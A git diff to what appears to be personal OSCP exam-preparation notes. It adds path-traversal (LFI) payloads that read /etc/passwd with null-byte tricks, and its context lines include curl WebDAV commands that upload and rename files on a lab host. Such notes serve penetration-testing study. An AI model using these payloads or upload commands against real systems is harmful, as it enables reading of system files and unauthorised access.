@@ -1,5 +1,9 @@
 # OSCP Services and Things-To-Try
 
+## Enumeration Process
+
+
+
 ## Services
 
 SSH (22)
@@ -55,6 +59,14 @@ WEBDAV vulns - manual
 ```bash
 $ curl -T '/path/to/local/file.txt' 'http://10.11.1.13/'                              # upload file to remote
 $ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[old]' # move .ext1 -> .ext2
+```
+
+LFI / RFI
+```
+# Append NULL bytes (prevent .ext concat to the end by application)
+http://example.com/index.php?page=../../../etc/passwd%00
+http://example.com/index.php?page=../../../etc/passwd%en
+http://example.com/index.php?page=../../../etc/passwd%00%en
 ```
 
 ## Reverse Shell Tips
